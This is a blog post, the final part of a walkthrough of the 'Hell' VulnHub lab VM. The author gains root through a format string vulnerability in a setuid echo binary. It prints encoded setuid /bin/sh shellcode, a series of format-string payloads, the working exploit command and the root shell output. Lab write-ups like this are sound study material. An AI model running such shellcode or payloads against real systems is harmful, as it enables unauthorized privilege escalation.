---
author: recrudesce
comments: false
date: 2014-07-21 21:14:03+00:00
layout: post
slug: hell-walkthrough-part-5
title: Hell Walkthrough – Part 5
wordpress_id: 143
categories:
- VM's
tags:
- boot2root
- g0tmi1k
- hacking
- hell
- nmap
- peleus
- vulnhub
---

[Part 1](http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/) | [Part 2](http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/) | [Part 3](http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/) | [Part 4](http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/) | Part 5

This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me and root. LET'S DO THIS !


## Orange Juice Doesn't Echo


The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There's got to be something wrong with it.
<!-- more -->

A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a "format string vulnerability".

![](https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg)

wut ?

What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check [this one out for formatstr vuln explanation](https://www.youtube.com/watch?v=NwzmYSlETI8) and the [follow up](https://www.youtube.com/watch?v=CHrs30g-3O0)) I still felt none the wiser.  But I figured I'd give it a go anyway.  What's the worst that can happen ?  I can't make it any more wrong now can I ?

Meh, let's put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we're progressing.


``` bash
export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41"')
```


So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you're unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that... it didn't work because my shellcode kept moving in memory.

![](http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif)

Apparently, though, you can overwrite entries in the .dtor part of the binary - don't ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again... 

Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It's also pretty obvious when I went back to basics about 7 attempts in.

[plain]
$(python -c 'print "\x5c\xf8\xff\xbf"')-%64362u-%116\$n
$(python -c 'print "AAAA"')-%64362u-%117\$n.
$(python -c 'print "\x14\x96\x0c\x08"')%64362u-%119\$n.
$(python -c 'print "\x5c\xf8\xff\xbf" + "\x5e\xf8\xff\xbf"')-%64362u-%4\$n-%5\$n
$(python -c 'print "\x5c\xf8\xff\xbf"')-%116\$n.
$(python -c 'print "AAAA"')%117\$x
%64364u$(python -c 'print "\x14\x96\x0c\x08"')%119\$n.
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAABBBB%49136u%120\$hn%15217c%119\$hn

```


I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I'm not 100% sure myself. I guess that's a follow up post sometime. Also, it is possible this wont work for you).

[plain]
$(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
```


Which when executed like this


``` bash

$ /home/oj/echo $(python -c 'print "\x14\x96\x0c\x08" + "\x16\x96\x0c\x08"')AAAB%49139u%118\$hn%15217c%117\$hn
```


dropped me to a shell.


``` bash

# id 
uid=0(root) gid=1005(oj) groups=0(root),1005(oj) 
# whoami 
root 
# cat /root/flag.txt 
Congratulations of beating Hell. 

I hope you enjoyed it and there weren't to many trolls in here for you. 

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de 


# 
```


![](http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif)



Like a baws.  Now I'm going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !
